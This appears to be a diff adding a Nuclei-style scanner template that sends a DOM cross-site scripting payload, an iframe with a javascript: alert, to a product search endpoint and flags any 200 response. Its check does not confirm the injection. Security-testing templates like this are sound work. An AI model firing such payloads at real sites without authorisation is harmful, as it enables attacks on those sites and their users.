@@ -1,0 +1,24 @@
+id: dom_xss
+
+info:
+  name: dom_xss
+  author: baothang
+  severity: low
+  description: basic dom xss attack
+  
+flow: |
+  http(1) 
+
+requests:
+  - raw:
+      - >
+        GET
+        /rest/products/search?q=<iframe+src%3d"javascript%3aalert(`xss`)">
+        HTTP/1.1
+
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
